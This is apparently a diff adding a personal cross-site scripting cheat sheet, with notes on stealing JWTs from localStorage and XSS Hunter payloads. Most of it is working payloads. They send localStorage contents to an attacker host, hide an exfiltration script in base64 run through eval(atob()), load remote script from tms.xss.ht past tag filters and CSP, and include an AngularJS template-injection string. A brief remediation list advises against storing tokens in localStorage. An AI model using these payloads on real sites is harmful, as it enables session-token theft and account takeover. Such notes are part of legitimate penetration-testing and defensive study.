@@ -1,0 +1,68 @@
+https://medium.com/redteam/stealing-jwts-in-localstorage-via-xss-6048d91378a0
+
+<script>alert(JSON.stringify(localStorage))</script>
+
+<img src=’https://<attacker-server>/yikes?jwt=’+JSON.stringify(localStorage);’--!>
+
+Remediation
+The biggest issue here is the lack of ability to apply traditional cookie security flags to items stored in localStorage.
+While every implementation will be different with varying factors. There is an approach you can follow to harden your JWTs by using traditional cookie protections. At a high-level:
+
+* NEVER store anything sensitive in localStorage such as JWTs or any other credential for that matter.
+  The purpose of localStorage is to provide user convenience and experience by saving website states and settings.
+* Consider using the cookie header over the authorisation header.
+* Set your cookie header protections.
+* Never render the token on screen, in URLs and/or in source code.
+
+----
+
+- retrieve one key : alert(localStorage.getItem("key"))
+- dumping all keys : alert(JSON.stringify(localStorage))
+
+--
+payload.js:
+=============
+var img = new Image(0,0); img.src='http://ip.address' + JSON.stringify(localStorage); document.body.appendChild(img);
+
+cat payload.js | base54
+dmFyIGltZyA9IG5ldyBJbWFnZSgwLDApOyBpbWcuc3JjPSdodHRwOi8vaXAuYWRkcmVzcycgKyBKU09OLnN0cmluZ2lmeShsb2NhbFN0b3JhZ2UpOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGltZyk7Cg
+
+javascript:eval(atob('dmFyIGltZyA9IG5ldyBJbWFnZSgwLDApOyBpbWcuc3JjPSdodHRwOi8vaXAuYWRkcmVzcycgKyBKU09OLnN0cmluZ2lmeShsb2NhbFN0b3JhZ2UpOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGltZyk7Cg'));
+
+----------
+
+https://xsshunter.com/app
+
+$.getScript() Payload - Example payload for sites that include JQuery
+<script>$.getScript("//tms.xss.ht")</script>
+
+XMLHTTPRequest Payload - For exploitation of web applications with Content Security Policies containing script-src but have unsafe-inline enabled.
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//tms.xss.ht");a.send();</script>
+
+<img> Tag Payload - Another basic payload for when <script> tags are explicitly filtered.
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdG1zLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
+
+javascript: URI Payload - For use where URI's are taken as input.
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://tms.xss.ht\';document.body.appendChild(a)')
+
+<input> Tag Payload - For bypassing poorly designed blacklist systems with the HTML5 autofocus attribute.
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdG1zLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>
+
+<video><source> Tag Payload - HTML5 payload, only works in Firefox, Chrome and Opera
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdG1zLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;>
+
+------------
+
+$.getScript('//path-to-JavaScript-file');
+
+$.getScript`//path-to-JavaScript-file`;
+
+$.getScript(`//path-to-JavaScript-file`, alert`1`);
+
+---
+https://appsec-labs.com/portal/angular-template-injection-without-quote-characters/
+
+Tested with AngularJS 1.5.11 (payload: <script>alert(1);</script>)
+
+	{{valueOf.name.constructor.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,59,60,47,115,99,114,105,112,116,62)}}
+
